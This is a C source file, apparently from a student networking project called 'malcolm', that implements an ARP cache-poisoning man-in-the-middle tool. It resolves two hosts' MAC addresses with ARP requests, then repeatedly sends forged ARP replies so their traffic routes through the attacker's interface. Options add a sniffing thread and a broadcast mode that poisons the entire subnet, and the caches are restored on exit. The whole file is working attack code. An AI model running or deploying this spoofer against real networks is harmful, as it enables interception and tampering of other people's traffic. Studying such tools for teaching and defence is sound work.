#include "../headers/malcolm.h"
#include "../headers/options.h"
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/if_arp.h>

static int handle_response(uint8_t *ip, char *buffer, uint8_t *received_mac)
{
	struct arp_hdr *arp;
	struct ethernet_hdr *ethernet;
	uint16_t type;
	uint16_t opcode;

	ethernet = (struct ethernet_hdr *)buffer;
	arp = (struct arp_hdr *)(buffer + sizeof(struct ethernet_hdr));

	type = ft_ntohs(ethernet->type);
	opcode = ft_ntohs(arp->op);

	if (g_data.opt & OPT_VERBOSE) {
		dprintf(STDOUT_FILENO, "[*] Received packet from ");
		print_ip(STDOUT_FILENO, arp->sip);
		dprintf(STDOUT_FILENO, " expecting ");
		print_ip(STDOUT_FILENO, ip);
		dprintf(STDOUT_FILENO, "\n");
		/* debug_packet(ethernet, arp); */
	}

	if (type == ETH_P_ARP && opcode == ARP_REPLY &&
		!filter_out(ip, arp->sip, IP_ADDR_LEN))
	{
		if (g_data.opt & OPT_VERBOSE)
			printf("[*] Valid ARP reply\n");
		ft_memcpy(received_mac, arp->sha, ETH_ADDR_LEN);
		return 1;
	}
	else if (g_data.opt & OPT_VERBOSE)
		dprintf(STDOUT_FILENO, "[*] Filtering request\n");

	return 0;
}

static int spoof(uint8_t *tip, uint8_t *tmac, uint8_t *sip, uint8_t *smac,
	struct sockaddr_ll sockaddr)
{
	socklen_t addr_len = sizeof(struct sockaddr_ll);
	struct arp_packet packet = {0};
	int ret;

	/* Setting ETHERNET flags */
	packet.ethernet.type = ft_ntohs(ETH_P_ARP);
	/* Setting ARP flags */
	packet.arp.hrd = ft_htons(HARDWARE_ETHERNET);
	packet.arp.hln = ETH_ADDR_LEN;
	packet.arp.pln = IP_ADDR_LEN;
	packet.arp.pro = ft_htons(ETH_P_IP);
	packet.arp.op = ft_htons(ARP_REPLY);

	/* Setting MAC addresses */
	/* Ethernet */
	ft_memcpy(packet.ethernet.dmac, tmac, ETH_ADDR_LEN);
	ft_memcpy(packet.ethernet.smac, smac, ETH_ADDR_LEN);
	/* ARP */
	ft_memcpy(packet.arp.tha, tmac, ETH_ADDR_LEN);
	ft_memcpy(packet.arp.sha, smac, ETH_ADDR_LEN);
	/* Setting IP addresses */
	ft_memcpy(packet.arp.sip, sip, IP_ADDR_LEN);
	ft_memcpy(packet.arp.tip, tip, IP_ADDR_LEN);

	/* debug_packet(&packet.ethernet, &packet.arp); */

	ret = sendto(g_data.sockfd, &packet, sizeof(struct arp_packet), 0,
		(struct sockaddr *)&sockaddr, addr_len);

	if (ret <= 0) {
		dprintf(STDERR_FILENO, "[!] Failed to send ARP replay for host ");
		print_ip(STDERR_FILENO, tip);
		dprintf(STDERR_FILENO, "\n");
		return 1;
	}

	if (g_data.opt & OPT_VERBOSE) {
		printf("[*] Sent %d byte(s) to ", ret);
		print_mac(packet.arp.tha);
		fflush(stdout);
		printf("\n");
		fflush(stdout);
	}

	return 0;
}

static int arp_request(uint8_t *tip, struct sockaddr_ll sockaddr,
	uint8_t *if_mac, uint8_t *if_ip, uint8_t *received_mac)
{
	socklen_t addr_len = sizeof(struct sockaddr_ll);
	struct arp_packet packet = {0};
	int ret;
	/* TODO: Parse dynamically the broadcast MAC address ? */
	/* We assume the broadcast is always ff:ff:ff:ff:ff:ff */
	uint8_t brdcst[ETH_ADDR_LEN] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
	int len = sizeof(struct ethernet_hdr) + sizeof(struct arp_hdr);
	char buffer[len];

	/* Setting ETHERNET flags */
	packet.ethernet.type = ft_ntohs(ETH_P_ARP);
	/* Setting ARP flags */
	packet.arp.hrd = ft_htons(HARDWARE_ETHERNET);
	packet.arp.hln = ETH_ADDR_LEN;
	packet.arp.pln = IP_ADDR_LEN;
	packet.arp.pro = ft_htons(ETH_P_IP);
	packet.arp.op = ft_htons(ARP_REQUEST);

	/* Setting MAC addresses */
	/* Ethernet */
	ft_memcpy(packet.ethernet.dmac, brdcst, ETH_ADDR_LEN);
	ft_memcpy(packet.ethernet.smac, if_mac, ETH_ADDR_LEN);
	/* ARP */
	ft_memcpy(packet.arp.sha, if_mac, ETH_ADDR_LEN);
	/* Setting IP addresses */
	ft_memcpy(packet.arp.sip, if_ip, IP_ADDR_LEN);
	ft_memcpy(packet.arp.tip, tip, IP_ADDR_LEN);

	/* debug_packet(&packet.ethernet, &packet.arp); */

	if (g_data.opt & OPT_VERBOSE) {
		dprintf(STDERR_FILENO, "[*] Sending ARP request to the broadcast for ");
		print_ip(STDOUT_FILENO, tip);
		fflush(stdout);
		printf("\n");
	}

	ret = sendto(g_data.sockfd, &packet, sizeof(struct arp_packet), 0,
		(struct sockaddr *)&sockaddr, addr_len);

	if (ret <= 0) {
		dprintf(STDERR_FILENO, "[!] Failed to send ARP request for host ");
		print_ip(STDERR_FILENO, tip);
		dprintf(STDERR_FILENO, "\n");
		return 1;
	}

	/* Waiting for response, it should be fast ! */
	dprintf(STDOUT_FILENO, "Waiting ARP response for ip ");
	print_ip(STDOUT_FILENO, tip);
	dprintf(STDOUT_FILENO, ", press CTRL+C to exit...\n");
	alarm(ARP_TIMEOUT); /* Set timeout to 3 by default, response should be fast */
	while (g_data.loop) {
		ret = recvfrom(g_data.sockfd, buffer, len, MSG_DONTWAIT,
			(struct sockaddr *)&sockaddr, &addr_len);
		if (ret > 0 && handle_response(tip, buffer, received_mac)) {
			print_ip(STDOUT_FILENO, tip);
			dprintf(STDOUT_FILENO, " is at ");
			print_mac(received_mac);
			fflush(stdout);
			dprintf(STDOUT_FILENO, "\n");
			alarm(0);
			return 0;
		}
	}

	dprintf(STDERR_FILENO, "[!] Couldn't manage to get MAC address for ip ");
	print_ip(STDERR_FILENO, tip);
	dprintf(STDERR_FILENO, "\n");

	return 1;
}

int ft_proxy(uint8_t *source_ip, uint8_t *target_ip)
{
	struct sockaddr_ll sockaddr;
	int if_idx;
	uint8_t if_mac[ETH_ADDR_LEN] = {0};
	uint8_t if_ip[IP_ADDR_LEN] = {0};
	uint8_t if_brdcst[IP_ADDR_LEN] = {0};
	struct timespec wait = {g_data.frequency, 0};
	uint64_t i = 0;
	int tret;
	pthread_t thread;

	ft_bzero(&sockaddr, sizeof(struct sockaddr_ll));

	/* Getting interface informations */
	if (g_data.opt & OPT_VERBOSE)
		printf("[*] Getting informations about interface %s\n", g_data.interface);
	if ((if_idx = interface_index(g_data.interface)) < 0)
		return 1;
	if (interface_mac(g_data.interface, if_mac) < 0)
		return 1;
	if (interface_ip(g_data.interface, if_ip) < 0)
		return 1;
	if (g_data.opt & OPT_BROADCAST) {
		uint8_t brdcst[ETH_ADDR_LEN] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
		if (interface_brdcst(g_data.interface, if_brdcst) < 0)
			return 1;
		ft_memcpy(g_data.target_ip, if_brdcst, IP_ADDR_LEN);
		ft_memcpy(g_data.target_mac, brdcst, ETH_ADDR_LEN);
	}

	if (g_data.opt & OPT_VERBOSE) {
		printf("[*] %s has index %d with MAC address ", g_data.interface, if_idx);
		print_mac(if_mac);
		printf(", IP address ");
		fflush(stdout);
		print_ip(STDOUT_FILENO, if_ip);
		if (g_data.opt & OPT_BROADCAST) {
			printf(" and broadcast address ");
			fflush(stdout);
			print_ip(STDOUT_FILENO, if_brdcst);
		}
		printf("\n");
	}

	/* Filling sockaddr_ll */
	sockaddr.sll_family = AF_PACKET;
	sockaddr.sll_protocol = htons(ETH_P_ALL);
	sockaddr.sll_ifindex = if_idx;
	sockaddr.sll_hatype = ARPHRD_ETHER;
	sockaddr.sll_pkttype = ARPHRD_NETROM;

	/* Getting MAC addresses with ARP requests */
	if (g_data.opt & OPT_BROADCAST) {
		if (arp_request(source_ip, sockaddr, if_mac, if_ip, g_data.source_mac))
			return 1;
	}
	else {
		if (arp_request(source_ip, sockaddr, if_mac, if_ip, g_data.source_mac) ||
			arp_request(target_ip, sockaddr, if_mac, if_ip, g_data.target_mac))
			return 1;
	}

	dprintf(STDOUT_FILENO, "Proxying between ");
	print_ip(STDOUT_FILENO, g_data.source_ip);
	dprintf(STDOUT_FILENO, " and ");
	print_ip(STDOUT_FILENO, g_data.target_ip);
	if (g_data.duration) {
		dprintf(STDOUT_FILENO, " for %d seconds", g_data.duration);
		alarm(g_data.duration);
	}
	dprintf(STDOUT_FILENO, "\n");

	if (g_data.opt & OPT_VERBOSE)
		printf("[*] Starting the spoof process\n");

	/* LISTEN THREAD INIT */
	if (g_data.opt & OPT_SNIFF)
		tret = launch_thread(&thread);

	while (g_data.loop) {
		if (g_data.opt & OPT_BROADCAST) {
			if ((spoof(target_ip, g_data.target_mac, source_ip, if_mac,
				sockaddr) != 0))
			{
				break;
			}
		}
		else {
			if ((spoof(target_ip, g_data.target_mac, source_ip, if_mac,
				sockaddr)) != 0 ||
				(spoof(source_ip, g_data.source_mac, target_ip, if_mac,
				sockaddr) != 0))
			{
				break;
			}
		}

		if (!(g_data.opt & OPT_SNIFF)) {
			/* Display related */
			ft_putchar('\r');
			printf("Spoofing ");
			fflush(stdout);
			ft_putchar(g_data.wait_loop[i % g_data.wait_loop_len]);
			i++;
		}

		if (g_data.opt & OPT_VERBOSE) {
			if (!(g_data.opt & OPT_SNIFF))
				printf("\n");
			printf("[*] Waiting %d seconds\n", g_data.frequency);
		}
		clock_nanosleep(CLOCK_REALTIME, 0, &wait, NULL);
	}

	/* CLOSE LISTEN THREAD */
	int *retval;
	if (g_data.opt & OPT_SNIFF && !tret &&
		pthread_join(thread, (void**)&retval) != 0)
		fprintf(stderr, "[!] Failed to close thread\n");

	/* Restore ARP cache for targets */
	printf("Restoring ARP cache for targets\n");
	i = 4;
	while (i > 0) {
		spoof(target_ip, g_data.target_mac, source_ip, g_data.source_mac, sockaddr);
		if (!(g_data.opt & OPT_BROADCAST))
			spoof(source_ip, g_data.source_mac, target_ip, g_data.target_mac, sockaddr);
		i--;
	}

	return 0;
}
